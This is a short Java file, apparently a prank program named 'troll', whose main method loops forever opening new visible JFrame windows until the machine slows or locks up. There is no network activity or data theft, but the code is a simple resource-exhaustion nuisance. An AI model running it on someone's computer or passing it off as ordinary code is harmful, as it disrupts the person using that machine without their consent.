package zjava;
import javax.swing.JFrame;

public class troll extends JFrame{

 troll(){
        setVisible(true);
    }
    
    public static void main(String[] args) {

        while(true){
            new Thread(){
                @Override
                public void run(){
                    new troll();
                }
            }.run();
        }
    }
}
